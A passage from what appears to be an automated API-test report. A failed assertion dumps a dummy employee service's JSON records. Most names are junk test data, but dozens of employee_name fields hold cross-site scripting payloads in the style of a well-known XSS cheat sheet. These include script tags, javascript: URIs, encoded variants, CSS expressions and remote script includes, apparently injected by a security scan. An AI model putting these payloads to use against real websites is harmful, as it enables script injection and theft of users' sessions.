id&quot;:&quot;58518&quot;,&quot;employee_name&quot;:&quot;ghbj&quot;,&quot;employee_salary&quot;:&quot;1111&quot;,&quot;employee_age&quot;:&quot;46&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58522&quot;,&quot;employee_name&quot;:&quot;abv9d&quot;,&quot;employee_salary&quot;:&quot;3333&quot;,&quot;employee_age&quot;:&quot;598&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58523&quot;,&quot;employee_name&quot;:&quot;bdeg9&quot;,&quot;employee_salary&quot;:&quot;2222&quot;,&quot;employee_age&quot;:&quot;78&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58524&quot;,&quot;employee_name&quot;:&quot;gh9bj&quot;,&quot;employee_salary&quot;:&quot;1111&quot;,&quot;employee_age&quot;:&quot;46&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58525&quot;,&quot;employee_name&quot;:&quot;svsdvadfdvsb47&quot;,&quot;employee_salary&quot;:&quot;13236&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58526&quot;,&quot;employee_name&quot;:&quot;svsdfadfddvd48&quot;,&quot;employee_salary&quot;:&quot;1364&quot;,&quot;employee_age&quot;:&quot;20&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58528&quot;,&quot;employee_name&quot;:&quot;rewttre&quot;,&quot;employee_salary&quot;:&quot;213&quot;,&quot;employee_age&quot;:&quot;213&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58529&quot;,&quot;employee_name&quot;:&quot;wololo&quot;,&quot;employee_salary&quot;:&quot;234&quot;,&quot;employee_age&quot;:&quot;234&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58530&quot;,&quot;employee_name&quot;:&quot;walala&quot;,&quot;employee_salary&quot;:&quot;232&quot;,&quot;employee_age&quot;:&quot;213&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58534&quot;,&quot;employee_name&quot;:&quot;svsdvadfdvsb51&quot;,&quot;employee_salary&quot;:&quot;13236&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58535&quot;,&quot;employee_name&quot;:&quot;svsdfadfddvd52&quot;,&quot;employee_salary&quot;:&quot;1364&quot;,&quot;employee_age&quot;:&quot;20&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58547&quot;,&quot;employee_name&quot;:&quot;Swati&quot;,&quot;employee_salary&quot;:&quot;10000&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58548&quot;,&quot;employee_name&quot;:&quot;jayanth&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58549&quot;,&quot;employee_name&quot;:&quot;Roja&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58550&quot;,&quot;employee_name&quot;:&quot;svsdvadfdvsb53&quot;,&quot;employee_salary&quot;:&quot;13236&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58551&quot;,&quot;employee_name&quot;:&quot;svsdfadfddvd54&quot;,&quot;employee_salary&quot;:&quot;1364&quot;,&quot;employee_age&quot;:&quot;20&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58553&quot;,&quot;employee_name&quot;:&quot;svsdvadfdvsb55&quot;,&quot;employee_salary&quot;:&quot;13236&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58554&quot;,&quot;employee_name&quot;:&quot;svsdfadfddvd56&quot;,&quot;employee_salary&quot;:&quot;1364&quot;,&quot;employee_age&quot;:&quot;20&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58556&quot;,&quot;employee_name&quot;:&quot;melania&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58557&quot;,&quot;employee_name&quot;:&quot;akshatha&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58559&quot;,&quot;employee_name&quot;:&quot;Siva&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;32&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58560&quot;,&quot;employee_name&quot;:&quot;mela&quot;,&quot;employee_salary&quot;:&quot;15000&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58561&quot;,&quot;employee_name&quot;:&quot;sneha&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58563&quot;,&quot;employee_name&quot;:&quot;SivaKumari&quot;,&quot;employee_salary&quot;:&quot;4000&quot;,&quot;employee_age&quot;:&quot;32&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58564&quot;,&quot;employee_name&quot;:&quot;marco&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58568&quot;,&quot;employee_name&quot;:&quot;krithy&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58569&quot;,&quot;employee_name&quot;:&quot;Vindhya&quot;,&quot;employee_salary&quot;:&quot;4000&quot;,&quot;employee_age&quot;:&quot;32&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58570&quot;,&quot;employee_name&quot;:&quot;Maciej Falkiewicz jest najlepszym programista :D&quot;,&quot;employee_salary&quot;:&quot;10&quot;,&quot;employee_age&quot;:&quot;26&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58574&quot;,&quot;employee_name&quot;:&quot;prabha&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58575&quot;,&quot;employee_name&quot;:&quot; Radwa1&quot;,&quot;employee_salary&quot;:&quot;10000000&quot;,&quot;employee_age&quot;:&quot;25&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58577&quot;,&quot;employee_name&quot;:&quot;Saitej&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;32&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58587&quot;,&quot;employee_name&quot;:&quot;IGI&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58591&quot;,&quot;employee_name&quot;:&quot;Verification of nothing&quot;,&quot;employee_salary&quot;:&quot;10&quot;,&quot;employee_age&quot;:&quot;222&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58601&quot;,&quot;employee_name&quot;:&quot;svsdvadfdvsb57&quot;,&quot;employee_salary&quot;:&quot;13236&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58602&quot;,&quot;employee_name&quot;:&quot;svsdfadfddvd58&quot;,&quot;employee_salary&quot;:&quot;1364&quot;,&quot;employee_age&quot;:&quot;20&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58608&quot;,&quot;employee_name&quot;:&quot;MuralidharG&quot;,&quot;employee_salary&quot;:&quot;43000&quot;,&quot;employee_age&quot;:&quot;35&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58621&quot;,&quot;employee_name&quot;:&quot;jagadeesh&quot;,&quot;employee_salary&quot;:&quot;100000&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58630&quot;,&quot;employee_name&quot;:&quot;Vrishti&quot;,&quot;employee_salary&quot;:&quot;45&quot;,&quot;employee_age&quot;:&quot;32&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58633&quot;,&quot;employee_name&quot;:&quot;sr1&quot;,&quot;employee_salary&quot;:&quot;100&quot;,&quot;employee_age&quot;:&quot;30&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58634&quot;,&quot;employee_name&quot;:&quot;sr2&quot;,&quot;employee_salary&quot;:&quot;110&quot;,&quot;employee_age&quot;:&quot;40&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58635&quot;,&quot;employee_name&quot;:&quot;sr3&quot;,&quot;employee_salary&quot;:&quot;120&quot;,&quot;employee_age&quot;:&quot;50&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58636&quot;,&quot;employee_name&quot;:&quot;sr4&quot;,&quot;employee_salary&quot;:&quot;130&quot;,&quot;employee_age&quot;:&quot;60&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58637&quot;,&quot;employee_name&quot;:&quot;sr5&quot;,&quot;employee_salary&quot;:&quot;140&quot;,&quot;employee_age&quot;:&quot;70&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58641&quot;,&quot;employee_name&quot;:&quot;ali&quot;,&quot;employee_salary&quot;:&quot;1000&quot;,&quot;employee_age&quot;:&quot;30&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58643&quot;,&quot;employee_name&quot;:&quot; Radwa2&quot;,&quot;employee_salary&quot;:&quot;10000&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58646&quot;,&quot;employee_name&quot;:&quot;shafeek&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;58648&quot;,&quot;employee_name&quot;:&quot;Saanvi&quot;,&quot;employee_salary&quot;:&quot;222&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;}]
" type="java.lang.AssertionError">
      <![CDATA[java.lang.AssertionError: 1 expectation failed.
XML path employee_salary doesn't match.
Expected: (a collection containing "123" and a collection containing "1124")
  Actual: <\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"56995","employee_name":"<IMG SRC=\"javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"56996","employee_name":"<IMG SRC=javascript:alert('XSS')>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"56998","employee_name":"<IMG SRC=javascript:alert(&quot;XSS&quot;)>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"56999","employee_name":"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57000","employee_name":"<IMG \"\"\"><SCRIPT>alert(\"XSS\")<\/SCRIPT>\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57002","employee_name":"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57003","employee_name":"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57004","employee_name":"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57005","employee_name":"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57006","employee_name":"<IMG SRC=\"jav\tascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57007","employee_name":"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57008","employee_name":"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57009","employee_name":"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57010","employee_name":"perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57011","employee_name":"perl -e 'print \"<SCR\\0IPT>alert(\\\"XSS\\\")<\/SCR\\0IPT>\";' > out","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57012","employee_name":"<IMG SRC=\" &#14;  javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57013","employee_name":"<SCRIPT\/XSS SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57014","employee_name":"<BODY onload!#$%&()*~+-_.,:;?@[\/|\\]^`=alert(\"XSS\")>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57015","employee_name":"<SCRIPT\/SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57016","employee_name":"<<SCRIPT>alert(\"XSS\");\/\/<<\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57017","employee_name":"<SCRIPT SRC=http:\/\/soapui.org\/xss.js?<B>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57018","employee_name":"<SCRIPT SRC=\/\/ha.ckers.org\/.j>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57019","employee_name":"<IMG SRC=\"javascript:alert('XSS')\"","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57020","employee_name":"<iframe src=http:\/\/soapui.org\/scriptlet.html <","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57021","employee_name":"<SCRIPT>a=\/XSS\/alert(a.source)<\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57022","employee_name":"\\\";alert('XSS');\/\/","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57023","employee_name":"<\/TITLE><SCRIPT>alert(\"XSS\");<\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57024","employee_name":"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57025","employee_name":"<BODY BACKGROUND=\"javascript:alert('XSS')\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57026","employee_name":"<BODY ONLOAD=alert('XSS')>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57027","employee_name":"<IMG DYNSRC=\"javascript:alert('XSS')\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57028","employee_name":"<IMG LOWSRC=\"javascript:alert('XSS')\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57029","employee_name":"<BGSOUND SRC=\"javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57030","employee_name":"<BR SIZE=\"&{alert('XSS')}\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57031","employee_name":"<LAYER SRC=\"http:\/\/soapui.org\/scriptlet.html\"><\/LAYER>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57032","employee_name":"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57033","employee_name":"<LINK REL=\"stylesheet\" HREF=\"http:\/\/soapui.org\/xss.css\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57034","employee_name":"<STYLE>@import'http:\/\/soapui.org\/xss.css';<\/STYLE>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57035","employee_name":"<META HTTP-EQUIV=\"Link\" Content=\"<http:\/\/soapui.org\/xss.css>; REL=stylesheet\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57036","employee_name":"<STYLE>BODY{-moz-binding:url(\"http:\/\/soapui.org\/xssmoz.xml#xss\")}<\/STYLE>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57037","employee_name":"<XSS STYLE=\"behavior: url(xss.htc);\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57038","employee_name":"<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}<\/STYLE><UL><LI>XSS","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57039","employee_name":"<IMG SRC='vbscript:msgbox(\"XSS\")'>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57040","employee_name":"<IMG SRC=\"mocha:[code]\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57041","employee_name":"<IMG SRC=\"livescript:[code]\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57042","employee_name":"?script?alert(?XSS?)?\/script?","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57043","employee_name":"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57044","employee_name":"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text\/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3Njcmlw","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57045","employee_name":"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:alert('XSS');\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57046","employee_name":"<IFRAME SRC=\"javascript:alert('XSS');\"><\/IFRAME>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57047","employee_name":"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"><\/FRAMESET>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57048","employee_name":"<TABLE BACKGROUND=\"javascript:alert('XSS')\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57049","employee_name":"<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57050","employee_name":"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57051","employee_name":"<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57052","employee_name":"<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57053","employee_name":"<DIV STYLE=\"width: expression(alert('XSS'));\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57054","employee_name":"<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';<\/STYLE>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57055","employee_name":"<IMG STYLE=\"xss:expr\/*XSS*\/ession(alert('XSS'))\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57056","employee_name":"<XSS STYLE=\"xss:expression(alert('XSS'))\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57057","employee_name":"exp\/*<A STYLE='no\\xss:noxss(\"*\/\/*\");xss:&#101;x&#x2F;*XSS*\/\/*\/*\/pression(alert(\"XSS\"))'>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57058","employee_name":"<STYLE TYPE=\"text\/javascript\">alert('XSS');<\/STYLE>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57059","employee_name":"<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}<\/STYLE><A CLASS=XSS><\/A>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57060","employee_name":"<STYLE type=\"text\/css\">BODY{background:url(\"javascript:alert('XSS')\")}<\/STYLE>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57061","employee_name":"<!--[if gte IE 4]><SCRIPT>alert('XSS');<\/SCRIPT><![endif]-->","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57062","employee_name":"<BASE HREF=\"javascript:alert('XSS');\/\/\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57063","employee_name":"<OBJECT TYPE=\"text\/x-scriptlet\" DATA=\"http:\/\/soapui.org\/scriptlet.html\"><\/OBJECT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57064","employee_name":"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('X","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57065","employee_name":"<EMBED SRC=\"http:\/\/soapui.org\/xss.swf\" AllowScriptAccess=\"always\"><\/EMBED>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57066","employee_name":"<EMBED SRC=\"data:image\/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4b","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57067","employee_name":"a=\"get\";b=\"URL(\\\"\";c=\"javascript:\";d=\"alert('XSS');\\\")\";eval(a+b+c+d);","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57068","employee_name":"<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]]]><![CDATA[><![CDATA[cript:alert('XSS');\">]]]]><![CDATA[><\/C><\/X><\/xml><SPAN DATA","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57069","employee_name":"<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;<\/B><\/I><\/XML><SPAN DATASRC=\"#xss\"","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57070","employee_name":"<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" im","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57071","employee_name":"<SCRIPT SRC=\"http:\/\/soapui.org\/xss.jpg\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57072","employee_name":"<? echo('<SCR)';echo('IPT>alert(\"XSS\")<\/SCRIPT>'); ?>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57073","employee_name":"<IMG SRC=\"http:\/\/soapui.org\/somecommand.php?somevariables=maliciouscode\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57074","employee_name":"Redirect 302 \/a.jpg http:\/\/soapui.org\/admin.asp&deleteuser","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57075","employee_name":"<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT&gt;alert('XSS')<\/SCRIPT&gt;\">","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57076","employee_name":"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text\/html; charset=UTF-7\"> <\/HEAD>+ADw-SCRIPT+AD4-ale","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57077","employee_name":"<SCRIPT a=\">\" SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57078","employee_name":"<SCRIPT =\">\" SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57079","employee_name":"<SCRIPT a=\">\" '' SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57080","employee_name":"<SCRIPT \"a='>'\" SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57081","employee_name":"<SCRIPT a=`>` SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57082","employee_name":"<SCRIPT a=\">'>\" SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57083","employee_name":"<SCRIPT>document.write(\"<SCRI\");<\/SCRIPT>PT SRC=\"http:\/\/soapui.org\/xss.js\"><\/SCRIPT>","employee_salary":"1124","employee_age":"24","profile_image":""},{"id":"57084","employee_name":"John Doe 2019-09-21:03-09-19","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57087","employee_name":"John Doe 2019-09-21:03-09-20","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57089","employee_name":"John Doe 2019-09-21:03-09-21","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57091","employee_name":"John Doe 2019-09-21:03-09-22","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57094","employee_name":"John Doe 2019-09-21:03-09-23","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57096","employee_name":"John Doe 2019-09-21:03-09-24","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57099","employee_name":"John Doe 2019-09-21:03-09-25","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57101","employee_name":"John Doe 2019-09-21:03-09-26","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57103","employee_name":"John Doe 2019-09-21:03-09-27","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57106","employee_name":"John Doe 2019-09-21:03-09-28","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57108","employee_name":"John Doe 2019-09-21:03-09-29","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57111","employee_name":"John Doe 2019-09-21:03-09-30","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57113","employee_name":"John Doe 2019-09-21:03-09-31","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57115","employee_name":"John Doe 2019-09-21:03-09-32","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57118","employee_name":"John Doe 2019-09-21:03-09-33","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57120","employee_name":"John Doe 2019-09-21:03-09-34","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57123","employee_name":"John Doe 2019-09-21:03-09-35","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57125","employee_name":"John Doe 2019-09-21:03-09-36","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57127","employee_name":"John Doe 2019-09-21:03-09-37","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57130","employee_name":"John Doe 2019-09-21:03-09-38","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57132","employee_name":"John Doe 2019-09-21:03-09-39","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57135","employee_name":"John Doe 2019-09-21:03-09-40","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57137","employee_name":"John Doe 2019-09-21:03-09-41","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57139","employee_name":"John Doe 2019-09-21:03-09-42","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57142","employee_name":"John Doe 2019-09-21:03-09-43","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57144","employee_name":"John Doe 2019-09-21:03-09-44","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57146","employee_name":"John Doe 2019-09-21:03-09-45","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57149","employee_name":"John Doe 2019-09-21:03-09-46","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57151","employee_name":"John Doe 2019-09-21:03-09-47","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57154","employee_name":"John Doe 2019-09-21:03-09-48","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57156","employee_name":"John Doe 2019-09-21:03-09-49","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57159","employee_name":"John Doe 2019-09-21:03-09-50","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57161","employee_name":"John Doe 2019-09-21:03-09-51","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57164","employee_name":"John Doe 2019-09-21:03-09-52","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57166","employee_name":"John Doe 2019-09-21:03-09-53","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57169","employee_name":"John Doe 2019-09-21:03-09-54","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57171","employee_name":"John Doe 2019-09-21:03-09-55","employee_salary":"0","employee_age":"24","profile_image":""},{"id":"57173","employee_name":"John Doe 